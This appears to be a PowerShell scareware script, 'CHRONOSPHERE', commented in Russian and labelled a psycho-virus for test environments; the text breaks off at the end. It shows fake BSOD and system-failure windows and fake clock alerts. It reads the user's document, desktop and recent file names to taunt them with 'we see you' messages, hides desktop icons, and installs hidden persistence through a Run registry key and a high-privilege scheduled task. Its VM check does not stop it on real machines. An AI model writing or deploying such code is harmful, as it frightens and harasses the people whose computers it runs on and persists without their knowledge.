# ============================================================
# [PROJECT: CHRONOSPHERE] Автоматический психо-вирусный модуль
# Объединенные слои: Визуальный + Временной + Персональный
# Автозапуск с тайм-лимитами и безопасными остановками
# ТОЛЬКО для виртуальных/изолированных тестовых сред
# ============================================================

#region Конфигурация времени
$Global:TimeConfig = @{
    TotalRuntime = 30 * 60  # 30 минут максимум (в секундах)
    EscalationTime = 5 * 60  # 5 минут до эскалации
    DeescalationTime = 20 * 60  # 20 минут бездействия -> смягчение
    AutoShutdown = 60 * 60  # 1 час - самоуничтожение
    StartTime = [DateTime]::Now
    LastUserActivity = [DateTime]::Now
}
#endregion

#region Безопасные остановки
$Global:SafetyTriggers = @{
    Safewords = @("CHRONOSTOP", "ABYSSEXIT", "REALITYCHECK")
    KeyCombination = "Ctrl+Alt+Shift+F12"
    EmergencyFile = "C:\SAFE_EXIT.now"
    TimeoutExit = $false
}

# Создаем глобальный мьютекс для предотвращения множественного запуска
$mutex = New-Object System.Threading.Mutex($false, "ChronosphereMutex")
if (-not $mutex.WaitOne(0, $false)) {
    exit  # Уже запущено
}
#endregion

#region Инициализация
function Initialize-Chronosphere {
    param([switch]$AutoStart)
    
    Write-Host "[CHRONOSPHERE] Инициализация системы..." -ForegroundColor Cyan
    
    # Проверка на виртуальную среду
    $isVM = Test-VirtualEnvironment
    if (-not $isVM) {
        Write-Host "[WARNING] Не виртуальная среда! Активирован безопасный режим." -ForegroundColor Red
        $Global:SafetyTriggers.TimeoutExit = $true
        $Global:TimeConfig.TotalRuntime = 300  # 5 минут в не-VM
    }
    
    # Создание временных директорий
    $tempDirs = @(
        "$env:TEMP\Chronosphere",
        "$env:TEMP\Chronosphere\Logs",
        "$env:TEMP\Chronosphere\Backup",
        "$env:TEMP\Chronosphere\Effects"
    )
    
    foreach ($dir in $tempDirs) {
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }
    }
    
    # Сохраняем резервные копии критических настроек
    Backup-SystemSettings
    
    # Устанавливаем хуки для отслеживания активности
    Register-ActivityHooks
    
    # Запускаем основной таймер
    Start-MainLoop
}

function Test-VirtualEnvironment {
    # Проверка на виртуальную машину
    $vmIndicators = @(
        (Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*",
        (Get-WmiObject Win32_BaseBoard).Product -like "*Virtual*",
        (Get-Process | Where-Object {$_.Name -like "*vmware*" -or $_.Name -like "*vbox*"}).Count -gt 0
    )
    
    return ($vmIndicators -contains $true)
}
#endregion

#region Визуальные эффекты (Слой 1)
function Start-VisualDistortion {
    # Запуск визуальных эффектов в отдельном процессе
    $visualScript = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$script:forms = @()
$script:timers = @()

function Show-BSODEffect {
    $form = New-Object Windows.Forms.Form
    $form.Text = "SYSTEM FAILURE"
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.BackColor = 'Blue'
    $form.TopMost = $true
    $form.Opacity = 0.7
    
    $label = New-Object Windows.Forms.Label
    $label.Text = "CRITICAL PROCESS DIED`n`nSTOP CODE: CHRONOSPHERE_MEMORY_CORRUPTION`n`nPLEASE WAIT"
    $label.ForeColor = 'White'
    $label.Font = New-Object Drawing.Font("Consolas", 20, [Drawing.FontStyle]::Bold)
    $label.TextAlign = 'MiddleCenter'
    $label.Dock = 'Fill'
    
    $form.Controls.Add($label)
    $form.Show()
    
    $timer = New-Object Windows.Forms.Timer
    $timer.Interval = 3000
    $timer.Add_Tick({
        $form.Close()
        $timer.Stop()
    })
    $timer.Start()
    
    $script:forms += $form
    $script:timers += $timer
}

function Start-PixelDistortion {
    $form = New-Object Windows.Forms.Form
    $form.Size = New-Object Drawing.Size(100, 100)
    $form.StartPosition = 'Manual'
    $form.FormBorderStyle = 'None'
    $form.BackColor = [Drawing.Color]::FromArgb(255, 0, 0)
    $form.TopMost = $true
    $form.ShowInTaskbar = $false
    $form.Opacity = 0.3
    
    $timer = New-Object Windows.Forms.Timer
    $timer.Interval = 100
    $timer.Add_Tick({
        $form.Location = New-Object Drawing.Point(
            (Get-Random -Minimum 0 -Maximum [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width),
            (Get-Random -Minimum 0 -Maximum [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
        )
        $form.BackColor = [Drawing.Color]::FromArgb(
            255,
            (Get-Random -Minimum 0 -Maximum 256),
            (Get-Random -Minimum 0 -Maximum 256),
            (Get-Random -Minimum 0 -Maximum 256)
        )
    })
    $timer.Start()
    
    $script:forms += $form
    $script:timers += $timer
}

function Invert-ScreenColors {
    $form = New-Object Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.BackColor = [Drawing.Color]::Black
    $form.TransparencyKey = [Drawing.Color]::Black
    $form.TopMost = $true
    $form.Opacity = 0.5
    
    $graphics = $form.CreateGraphics()
    $timer = New-Object Windows.Forms.Timer
    $timer.Interval = 500
    
    $timer.Add_Tick({
        if ($form.BackColor -eq [Drawing.Color]::Black) {
            $form.BackColor = [Drawing.Color]::White
        } else {
            $form.BackColor = [Drawing.Color]::Black
        }
    })
    $timer.Start()
    
    $script:forms += $form
    $script:timers += $timer
}

# Запускаем эффекты
$effects = @(
    { Show-BSODEffect },
    { Start-PixelDistortion },
    { Invert-ScreenColors }
)

$effectTimer = New-Object Windows.Forms.Timer
$effectTimer.Interval = 10000  # Каждые 10 секунд новый эффект
$effectCounter = 0

$effectTimer.Add_Tick({
    if ($effectCounter -lt $effects.Count) {
        & $effects[$effectCounter]
        $effectCounter++
    } else {
        $effectTimer.Stop()
    }
})

$effectTimer.Start()

[Windows.Forms.Application]::Run()
'@
    
    # Запускаем в отдельном процессе
    $ps = [PowerShell]::Create()
    $null = $ps.AddScript($visualScript)
    $handle = $ps.BeginInvoke()
    
    return @{
        PowerShell = $ps
        Handle = $handle
    }
}

function Show-GhostWindow {
    param([string]$Username)
    
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $messages = @(
        "$Username... мы видим тебя.",
        "Твои файлы... они с нами теперь.",
        "Системная память заражена: $((Get-Random -Minimum 1 -Maximum 100))%",
        "Ошибка в секторе $(Get-Random -Minimum 1000 -Maximum 9999)",
        "Хост-процесс Windows (RuntimeBroker.exe) нарушен"
    )
    
    $form = New-Object Windows.Forms.Form
    $form.Size = New-Object Drawing.Size(400, 200)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'FixedToolWindow'
    $form.Text = "SYSTEM ALERT"
    $form.TopMost = $true
    $form.BackColor = [Drawing.Color]::FromArgb(255, 30, 30, 30)
    
    $label = New-Object Windows.Forms.Label
    $label.Text = $messages | Get-Random
    $label.ForeColor = [Drawing.Color]::LimeGreen
    $label.Font = New-Object Drawing.Font("Consolas", 12)
    $label.Dock = 'Fill'
    $label.TextAlign = 'MiddleCenter'
    
    $form.Controls.Add($label)
    
    # Показываем и автоматически закрываем
    $form.Add_Shown({ $form.Activate() })
    $form.ShowDialog() | Out-Null
    Start-Sleep -Seconds 3
    $form.Close()
}
#endregion

#region Временные искажения (Слой 4)
function Start-TemporalAnomalies {
    # Сохраняем реальное время
    $Global:RealTime = Get-Date
    
    # Запускаем таймеры для временных искажений
    $timers = @()
    
    # Таймер 1: Случайные изменения отображения времени
    $timer1 = New-Object System.Timers.Timer
    $timer1.Interval = 30000  # 30 секунд
    $timer1.Enabled = $true
    $timer1.AutoReset = $true
    
    $timer1.Add_Elapsed({
        $anomalyType = Get-Random -Minimum 1 -Maximum 4
        switch ($anomalyType) {
            1 { Show-TimeJump }
            2 { Show-ReverseTime }
            3 { Show-FrozenTime }
            4 { Show-BrokenTime }
        }
    })
    
    $timers += $timer1
    
    # Таймер 2: Десинхронизация системных часов
    $timer2 = New-Object System.Timers.Timer
    $timer2.Interval = 45000  # 45 секунд
    $timer2.Enabled = $true
    $timer2.AutoReset = $true
    
    $timer2.Add_Elapsed({
        Create-TimeDesync
    })
    
    $timers += $timer2
    
    return $timers
}

function Show-TimeJump {
    $jumpTypes = @(
        @{Text = "СИСТЕМНОЕ ВРЕМЯ: 88:88:88"; Color = "Red"},
        @{Text = "ВРЕМЕННАЯ АНОМАЛИЯ: +$(Get-Random -Minimum 1 -Maximum 99) ЧАСОВ"; Color = "Yellow"},
        @{Text = "ХРОНОМЕТРИЧЕСКИЙ СБОЙ: $(Get-Date -Format 'dd.MM.yyyy') -> $(Get-Date -Year ((Get-Date).Year + (Get-Random -Minimum -10 -Maximum 10)) -Format 'dd.MM.yyyy')"; Color = "Cyan"}
    )
    
    $jump = $jumpTypes | Get-Random
    
    Add-Type -AssemblyName System.Windows.Forms
    $form = New-Object Windows.Forms.Form
    $form.Size = New-Object Drawing.Size(500, 100)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'Black'
    $form.Opacity = 0.8
    
    $label = New-Object Windows.Forms.Label
    $label.Text = $jump.Text
    $label.ForeColor = $jump.Color
    $label.Font = New-Object Drawing.Font("Consolas", 14, [Drawing.FontStyle]::Bold)
    $label.Dock = 'Fill'
    $label.TextAlign = 'MiddleCenter'
    
    $form.Controls.Add($label)
    $form.Show()
    
    # Автозакрытие через 3 секунды
    $timer = New-Object Windows.Forms.Timer
    $timer.Interval = 3000
    $timer.Add_Tick({ 
        $form.Close()
        $timer.Stop()
    })
    $timer.Start()
}

function Show-ReverseTime {
    $form = New-Object Windows.Forms.Form
    $form.Size = New-Object Drawing.Size(400, 150)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'None'
    $form.BackColor = 'DarkRed'
    $form.TopMost = $true
    $form.Opacity = 0.9
    
    $label = New-Object Windows.Forms.Label
    $label.Text = "ВРЕМЯ ИДЕТ НАЗАД:`n$(Get-Date -Format 'HH:mm:ss')`n↓`n$((Get-Date).AddMinutes(-5) -Format 'HH:mm:ss')"
    $label.ForeColor = 'White'
    $label.Font = New-Object Drawing.Font("Consolas", 16, [Drawing.FontStyle]::Bold)
    $label.Dock = 'Fill'
    $label.TextAlign = 'MiddleCenter'
    
    $form.Controls.Add($label)
    $form.Show()
    
    $timer = New-Object Windows.Forms.Timer
    $timer.Interval = 3000
    $timer.Add_Tick({ 
        $form.Close()
        $timer.Stop()
    })
    $timer.Start()
}

function Show-FrozenTime {
    $form = New-Object Windows.Forms.Form
    $form.Size = New-Object Drawing.Size(350, 120)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'None'
    $form.BackColor = 'DarkBlue'
    $form.TopMost = $true
    $form.Opacity = 0.9
    
    $label = New-Object Windows.Forms.Label
    $label.Text = "ВРЕМЯ ЗАМЕРОЗКА`n⏰ $(Get-Date -Format 'HH:mm:ss')`n⏸ ЗАМОРОЖЕНО"
    $label.ForeColor = 'Cyan'
    $label.Font = New-Object Drawing.Font("Consolas", 14, [Drawing.FontStyle]::Bold)
    $label.Dock = 'Fill'
    $label.TextAlign = 'MiddleCenter'
    
    $form.Controls.Add($label)
    $form.Show()
    
    $timer = New-Object Windows.Forms.Timer
    $timer.Interval = 4000
    $timer.Add_Tick({ 
        $form.Close()
        $timer.Stop()
    })
    $timer.Start()
}

function Show-BrokenTime {
    $form = New-Object Windows.Forms.Form
    $form.Size = New-Object Drawing.Size(450, 180)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'None'
    $form.BackColor = 'DarkGreen'
    $form.TopMost = $true
    $form.Opacity = 0.9
    
    $brokenTime = "$(Get-Random -Minimum 0 -Maximum 99):$(Get-Random -Minimum 0 -Maximum 99):$(Get-Random -Minimum 0 -Maximum 99)"
    $label = New-Object Windows.Forms.Label
    $label.Text = "ХРОНОМЕТРИЧЕСКИЙ СБОЙ`n📟 $brokenTime`n🔧 СИСТЕМНЫЕ ЧАСЫ НЕИСПРАВНЫ"
    $label.ForeColor = 'Yellow'
    $label.Font = New-Object Drawing.Font("Consolas", 15, [Drawing.FontStyle]::Bold)
    $label.Dock = 'Fill'
    $label.TextAlign = 'MiddleCenter'
    
    $form.Controls.Add($label)
    $form.Show()
    
    $timer = New-Object Windows.Forms.Timer
    $timer.Interval = 3500
    $timer.Add_Tick({ 
        $form.Close()
        $timer.Stop()
    })
    $timer.Start()
}

function Create-TimeDesync {
    # Создаем временные файлы с разным временем
    $times = @(
        (Get-Date).AddHours(-5),
        (Get-Date).AddDays(3),
        (Get-Date).AddYears(1),
        (Get-Date).AddMonths(-2)
    )
    
    $tempFile = "$env:TEMP\Chronosphere\time_anomaly_$(Get-Random -Minimum 1000 -Maximum 9999).log"
    
    $content = @()
    foreach ($t in $times) {
        $content += "LOG ENTRY: $($t.ToString('yyyy-MM-dd HH:mm:ss.fff')) - Temporal anomaly detected"
        $content += "VECTOR: Chronosphere/TimeDesync/$(Get-Random -Minimum 1 -Maximum 9)"
        $content += "SEVERITY: $(Get-Random -Minimum 1 -Maximum 10)/10"
        $content += ""
    }
    
    $content | Out-File -FilePath $tempFile -Encoding UTF8
    
    # Меняем время создания файла
    $randomTime = $times | Get-Random
    $file = Get-Item $tempFile
    $file.CreationTime = $randomTime
    $file.LastWriteTime = $randomTime.AddMinutes((Get-Random -Minimum 1 -Maximum 60))
}
#endregion

#region Персональная пси-атака (Слой 5)
function Start-PersonalPsychologicalAttack {
    param([string]$Username)
    
    # Собираем информацию о пользователе (только безопасные данные)
    $userData = @{
        Username = $Username
        DocumentsCount = (Get-ChildItem "$env:USERPROFILE\Documents" -File -ErrorAction SilentlyContinue).Count
        DesktopFiles = (Get-ChildItem "$env:USERPROFILE\Desktop" -File -ErrorAction SilentlyContinue).Name
        RecentFiles = Get-RecentFiles
        SystemUptime = [math]::Round(((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalHours, 1)
    }
    
    # Запускаем таймер для персонализированных сообщений
    $timer = New-Object System.Timers.Timer
    $timer.Interval = 120000  # 2 минуты
    $timer.Enabled = $true
    $timer.AutoReset = $true
    
    $messageIndex = 0
    $messageTypes = @('файлы', 'документы', 'данные')
    $personalMessages = @(
        "Привет, $Username. Мы изучаем твои $($messageTypes | Get-Random)...",
        "Обнаружено: $(if ($userData.DocumentsCount -gt 50) {'Много документов'} else {'Немного документов'}) в папке Documents",
        "Время работы системы: $($userData.SystemUptime) часов. До сбоя: $(Get-Random -Minimum 1 -Maximum 99) минут",
        "$Username... твои недавние файлы: $((@($userData.RecentFiles) | Select-Object -First 3) -join ', ')",
        "Мы знаем о тебе больше, чем ты думаешь. $(Get-Date -Format 'HH:mm') - это не настоящее время"
    )
    
    $timer.Add_Elapsed({
        if ($messageIndex -lt $personalMessages.Count) {
            Show-PersonalMessage -Message $personalMessages[$messageIndex]
            $messageIndex++
        } else {
            $timer.Stop()
        }
    })
    
    # Запускаем газлайтинг-эффекты
    Start-GaslightingEffects -UserData $userData
    
    return $timer
}

function Get-RecentFiles {
    # Безопасное получение недавних файлов (только имена)
    $recent = @()
    
    # Проверяем недавние документы
    $recentPaths = @(
        "$env:USERPROFILE\Recent",
        "$env:APPDATA\Microsoft\Windows\Recent"
    )
    
    foreach ($path in $recentPaths) {
        if (Test-Path $path) {
            $files = Get-ChildItem $path -File -ErrorAction SilentlyContinue | 
                     Select-Object -First 5 -ExpandProperty Name
            $recent += $files
        }
    }
    
    return $recent | Select-Object -Unique | Where-Object { $_ -notmatch '\.lnk$' }
}

function Show-PersonalMessage {
    param([string]$Message)
    
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $form = New-Object Windows.Forms.Form
    $form.Size = New-Object Drawing.Size(600, 150)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'FixedDialog'
    $form.Text = "СИСТЕМНОЕ УВЕДОМЛЕНИЕ"
    $form.TopMost = $true
    $form.BackColor = [Drawing.Color]::FromArgb(255, 10, 10, 40)
    
    $label = New-Object Windows.Forms.Label
    $label.Text = $Message
    $label.ForeColor = [Drawing.Color]::Cyan
    $label.Font = New-Object Drawing.Font("Segoe UI", 11)
    $label.Dock = 'Fill'
    $label.TextAlign = 'MiddleCenter'
    $label.Padding = New-Object System.Windows.Forms.Padding(10)
    
    $form.Controls.Add($label)
    
    # Кнопка закрытия
    $button = New-Object Windows.Forms.Button
    $button.Text = "ПОНЯТНО"
    $button.Size = New-Object Drawing.Size(100, 30)
    $button.Location = New-Object Drawing.Point(250, 100)
    $button.Add_Click({ $form.Close() })
    
    $form.Controls.Add($button)
    
    # Автозакрытие через 15 секунд
    $timer = New-Object Windows.Forms.Timer
    $timer.Interval = 15000
    $timer.Add_Tick({ 
        $form.Close()
        $timer.Stop()
    })
    $timer.Start()
    
    $form.ShowDialog() | Out-Null
}

function Start-GaslightingEffects {
    param($UserData)
    
    # Таймер для газлайтинг-эффектов
    $gaslightTimer = New-Object System.Timers.Timer
    $gaslightTimer.Interval = 180000  # 3 минуты
    $gaslightTimer.Enabled = $true
    $gaslightTimer.AutoReset = $true
    
    $effectIndex = 0
    $effects = @(
        {
            # "Исчезновение" иконок (скрываем на несколько секунд)
            $desktopPath = [Environment]::GetFolderPath('Desktop')
            $icons = Get-ChildItem $desktopPath -Filter "*.lnk" -ErrorAction SilentlyContinue
            if ($icons) {
                $icon = $icons | Get-Random
                $originalAttributes = (Get-Item $icon.FullName).Attributes
                (Get-Item $icon.FullName).Attributes = 'Hidden'
                
                Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
                
                (Get-Item $icon.FullName).Attributes = $originalAttributes
            }
        },
        {
            # Создание "призрачных" файлов
            $ghostFile = "$env:USERPROFILE\Desktop\DELETEME_$(Get-Random -Minimum 1000 -Maximum 9999).tmp"
            $content = @(
                "Этот файл не должен здесь быть",
                "Создан: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')",
                "Удалите меня, если видите"
            )
            $content | Out-File $ghostFile -Encoding ASCII
            Start-Sleep -Seconds 10
            Remove-Item $ghostFile -ErrorAction SilentlyContinue
        },
        {
            # Изменение фона рабочего стола на черный
            $code = @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    
    public static void SetBlackWallpaper() {
        string blackBMP = @"C:\Windows\Web\Wallpaper\Windows\img0.jpg";
        SystemParametersInfo(20, 0, blackBMP, 0x01 | 0x02);
    }
}
'@
            Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
            try {
                [Wallpaper]::SetBlackWallpaper()
            } catch {}
            
            Start-Sleep -Seconds 30
            
            # Восстанавливаем
            try {
                rundll32.exe user32.dll, UpdatePerUserSystemParameters
            } catch {}
        }
    )
    
    $gaslightTimer.Add_Elapsed({
        if ($effectIndex -lt $effects.Count) {
            try {
                & $effects[$effectIndex]
            } catch {
                # Игнорируем ошибки
            }
            $effectIndex++
        } else {
            $gaslightTimer.Stop()
        }
    })
    
    return $gaslightTimer
}
#endregion

#region Мониторинг активности и управление
function Register-ActivityHooks {
    # Регистрируем отслеживание активности
    $activityScript = @'
Add-Type -AssemblyName System.Windows.Forms
$script:lastActivity = [DateTime]::Now

$mouseHook = Register-ObjectEvent -InputObject ([System.Windows.Forms.Form]) -EventName "MouseMove" -Action {
    $script:lastActivity = [DateTime]::Now
}

$keyboardHook = Register-ObjectEvent -InputObject ([System.Windows.Forms.Form]) -EventName "KeyDown" -Action {
    $script:lastActivity = [DateTime]::Now
}

# Функция для получения времени последней активности
function Get-LastActivityTime {
    return $script:lastActivity
}
'@
    
    $activityPS = [PowerShell]::Create()
    $null = $activityPS.AddScript($activityScript)
    $activityHandle = $activityPS.BeginInvoke()
    
    return @{
        PowerShell = $activityPS
        Handle = $activityHandle
    }
}

function Backup-SystemSettings {
    # Сохраняем критичные настройки для восстановления
    $backupPath = "$env:TEMP\Chronosphere\Backup\system_backup_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
    
    $backupData = @{
        DateTime = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        Wallpaper = (Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name Wallpaper -ErrorAction SilentlyContinue).Wallpaper
        ScreenResolution = "$([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)x$([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)"
        ColorDepth = [System.Windows.Forms.Screen]::PrimaryScreen.BitsPerPixel
    }
    
    $backupData | ConvertTo-Json | Out-File -FilePath $backupPath -Encoding UTF8
}
#endregion

#region Основной цикл и управление
function Start-MainLoop {
    $username = $env:USERNAME
    $startTime = Get-Date
    
    Write-Host "[CHRONOSPHERE] Запуск в: $startTime" -ForegroundColor Green
    Write-Host "[CHRONOSPHERE] Пользователь: $username" -ForegroundColor Green
    Write-Host "[CHRONOSPHERE] Максимальное время работы: $([math]::Round($Global:TimeConfig.TotalRuntime / 60)) минут" -ForegroundColor Yellow
    
    # Запускаем все слои
    $visualJob = Start-VisualDistortion
    $temporalTimers = Start-TemporalAnomalies
    $psychoTimer = Start-PersonalPsychologicalAttack -Username $username
    
    # Главный таймер контроля
    $mainTimer = New-Object System.Timers.Timer
    $mainTimer.Interval = 10000  # Проверка каждые 10 секунд
    $mainTimer.Enabled = $true
    $mainTimer.AutoReset = $true
    
    $elapsedTime = 0
    $inactivityTime = 0
    $phase = 1
    
    $mainTimer.Add_Elapsed({
        $currentTime = Get-Date
        $elapsedTime = ($currentTime - $Global:TimeConfig.StartTime).TotalSeconds
        $inactivityTime = ($currentTime - $Global:TimeConfig.LastUserActivity).TotalSeconds
        
        # Проверка на аварийный выход
        if (Test-Path $Global:SafetyTriggers.EmergencyFile) {
            Write-Host "[CHRONOSPHERE] Обнаружен аварийный файл выхода!" -ForegroundColor Red
            Stop-Chronosphere -VisualJob $visualJob -TemporalTimers $temporalTimers -PsychoTimer $psychoTimer
            $mainTimer.Stop()
            return
        }
        
        # Проверка максимального времени
        if ($elapsedTime -ge $Global:TimeConfig.TotalRuntime) {
            Write-Host "[CHRONOSPHERE] Достигнут лимит времени!" -ForegroundColor Yellow
            Stop-Chronosphere -VisualJob $visualJob -TemporalTimers $temporalTimers -PsychoTimer $psychoTimer
            $mainTimer.Stop()
            return
        }
        
        # Проверка бездействия для деэскалации
        if ($inactivityTime -ge $Global:TimeConfig.DeescalationTime) {
            Write-Host "[CHRONOSPHERE] Обнаружено бездействие, смягчение эффектов..." -ForegroundColor Cyan
            # Уменьшаем интенсивность
            $mainTimer.Interval = 30000  # Увеличиваем интервал проверки
        }
        
        # Эскалация через 5 минут
        if ($elapsedTime -ge $Global:TimeConfig.EscalationTime -and $phase -eq 1) {
            Write-Host "[CHRONOSPHERE] Эскалация эффектов..." -ForegroundColor Red
            $phase = 2
        }
        
        # Вывод информации о состоянии (в логи)
        if (($elapsedTime % 60) -lt 10) {  # Каждую минуту
            $logEntry = @"
[STATUS] Время: $(Get-Date -Format 'HH:mm:ss')
         С момента запуска: $([math]::Round($elapsedTime / 60, 1)) мин
         Бездействие: $([math]::Round($inactivityTime / 60, 1)) мин
         Фаза: $phase
"@
            Add-Content -Path "$env:TEMP\Chronosphere\Logs\status.log" -Value $logEntry -ErrorAction SilentlyContinue
        }
    })
    
    # Ждем завершения или выхода
    while ($mainTimer.Enabled) {
        Start-Sleep -Seconds 1
        
        # Проверка на безопасные слова (в окнах консоли)
        if ($Host.UI.RawUI.KeyAvailable) {
            $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
            $Global:SafetyTriggers.Safewords | ForEach-Object {
                if ($key.Character -eq $_[0]) {  # Упрощенная проверка
                    Write-Host "`n[CHRONOSPHERE] Обнаружен стоп-сигнал!" -ForegroundColor Green
                    Stop-Chronosphere -VisualJob $visualJob -TemporalTimers $temporalTimers -PsychoTimer $psychoTimer
                    $mainTimer.Stop()
                    return
                }
            }
        }
    }
}

function Stop-Chronosphere {
    param(
        $VisualJob,
        $TemporalTimers,
        $PsychoTimer
    )
    
    Write-Host "`n[CHRONOSPHERE] Остановка системы..." -ForegroundColor Cyan
    
    # Останавливаем визуальные эффекты
    if ($VisualJob) {
        try {
            $VisualJob.PowerShell.EndInvoke($VisualJob.Handle)
            $VisualJob.PowerShell.Dispose()
        } catch {}
    }
    
    # Останавливаем временные таймеры
    if ($TemporalTimers) {
        $TemporalTimers | ForEach-Object {
            try { $_.Stop() } catch {}
            try { $_.Dispose() } catch {}
        }
    }
    
    # Останавливаем психологическую атаку
    if ($PsychoTimer) {
        try { $PsychoTimer.Stop() } catch {}
        try { $PsychoTimer.Dispose() } catch {}
    }
    
    # Восстанавливаем настройки
    Restore-SystemSettings
    
    # Показываем завершающее сообщение
    Show-ExitMessage
    
    # Очистка
    Cleanup-TemporaryFiles
    
    Write-Host "[CHRONOSPHERE] Система остановлена. Все эффекты отключены." -ForegroundColor Green
}

function Restore-SystemSettings {
    # Восстанавливаем обои
    try {
        rundll32.exe user32.dll, UpdatePerUserSystemParameters 2>$null
    } catch {}
    
    # Восстанавливаем скрытые файлы
    $desktopPath = [Environment]::GetFolderPath('Desktop')
    Get-ChildItem $desktopPath -Hidden -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $_.Attributes = 'Normal'
        } catch {}
    }
}

function Show-ExitMessage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $form = New-Object Windows.Forms.Form
    $form.Size = New-Object Drawing.Size(500, 300)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'FixedDialog'
    $form.Text = "CHRONOSPHERE - СЕАНС ЗАВЕРШЕН"
    $form.BackColor = [Drawing.Color]::FromArgb(255, 20, 20, 40)
    
    $label = New-Object Windows.Forms.Label
    $label.Text = "СИСТЕМНЫЙ ТЕСТ ЗАВЕРШЕН`n`nВсе эффекты отключены.`nСистема восстановлена.`n`nЭто был всего лишь тест.`n`nНадеемся, вы не слишком испугались."
    $label.ForeColor = [Drawing.Color]::LimeGreen
    $label.Font = New-Object Drawing.Font("Segoe UI", 12)
    $label.Dock = 'Fill'
    $label.TextAlign = 'MiddleCenter'
    $label.Padding = New-Object System.Windows.Forms.Padding(20)
    
    $form.Controls.Add($label)
    
    $button = New-Object Windows.Forms.Button
    $button.Text = "ЗАКРЫТЬ"
    $button.Size = New-Object Drawing.Size(100, 40)
    $button.Location = New-Object Drawing.Point(200, 220)
    $button.Add_Click({ $form.Close() })
    
    $form.Controls.Add($button)
    $form.ShowDialog() | Out-Null
}

function Cleanup-TemporaryFiles {
    # Удаляем временные файлы
    $tempPath = "$env:TEMP\Chronosphere"
    if (Test-Path $tempPath) {
        Remove-Item -Path $tempPath -Recurse -Force -ErrorAction SilentlyContinue
    }
    
    # Освобождаем мьютекс
    try {
        $mutex.ReleaseMutex()
        $mutex.Dispose()
    } catch {}
}
#endregion

#region Автозапуск
function Install-AutoStart {
    # Добавляем в автозагрузку через реестр
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "ChronosphereTest"
    $scriptPath = $MyInvocation.MyCommand.Definition
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    
    Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -AutoStart" -Force
    
    Write-Host "[CHRONOSPHERE] Автозапуск установлен" -ForegroundColor Green
    
    # Также создаем задание в планировщике (с задержкой 2 минуты после загрузки)
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -AutoStart"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $trigger.Delay = "PT2M"
    
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
    
    try {
        Register-ScheduledTask -TaskName "ChronosphereSystemTest" `
                               -Action $action `
                               -Trigger $trigger `
                               -Principal $principal `
                               -Settings $settings `
                               -Force | Out-Null
    } catch {
        Write-Host "[CHRONOSPHERE] Ошибка создания задачи в планировщике: $_" -ForegroundColor Yellow
    }
}

function Uninstall-AutoStart {
    # Удаляем из автозагрузки
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Remove-ItemProperty -Path $regPath -Name "ChronosphereTest" -ErrorAction SilentlyContinue
    
    # Удаляем задание из планировщика
    try {
        Unregister-ScheduledTask -TaskName "ChronosphereSystemTest" -Confirm:$false -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host "[CHRONOSPHERE] Автозапуск удален" -ForegroundColor Green
}
#endregion

#region Точка входа
param(
    [switch]$AutoStart,
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$SafeMode
)

# Проверка прав администратора
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($Uninstall) {
    Uninstall-AutoStart
    exit
}

if ($Install) {
    if (-not $isAdmin) {
        Write-Host "Требуются права администратора для установки автозапуска!" -ForegroundColor Red
        exit
    }
    Install-AutoStart
    exit
}

if ($SafeMode) {
    Write-Host "[CHRONOSPHERE] Безопасный режим активирован" -ForegroundColor Yellow
    $Global:TimeConfig.TotalRuntime = 300  # 5 минут
    $Global:TimeConfig.EscalationTime = 120  # 2 минуты
}

# Основной запуск
try {
    Initialize-Chronosphere -AutoStart:$AutoStart
}
catch {
